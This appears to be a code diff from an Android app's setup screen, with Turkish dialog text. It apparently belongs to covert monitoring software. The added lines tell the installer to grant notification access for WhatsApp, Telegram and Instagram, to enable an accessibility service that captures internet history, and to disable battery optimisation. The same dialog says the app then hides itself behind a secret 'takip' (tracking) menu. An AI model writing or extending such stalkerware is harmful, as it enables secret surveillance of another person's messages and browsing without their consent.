@@ -138,8 +138,12 @@ class SetupActivity : AppCompatActivity() {
             .setTitle("Kurulum Tamamlandı")
             .setMessage(
                 "Cihaz panele bağlandı.\n\n" +
+                "ÖNEMLİ: Sonraki ekranlarda şunları AÇIN:\n" +
+                "1) Bildirim erişimi (WhatsApp, Telegram, Instagram)\n" +
+                "2) Erişilebilirlik servisi (internet geçmişi)\n" +
+                "3) Pil optimizasyonunu kapatın\n\n" +
                 "Tamam'a basınca uygulama gizlenecek.\n" +
-                "Gizli menü: tarayıcıda takip://settings veya numara çeviricide *#*#5555555555#*#*$xiaomiNote"
+                "Gizli menü: tarayıcıda takip://settings$xiaomiNote"
             )
             .setCancelable(false)
             .setPositiveButton("Tamam") { _, _ ->
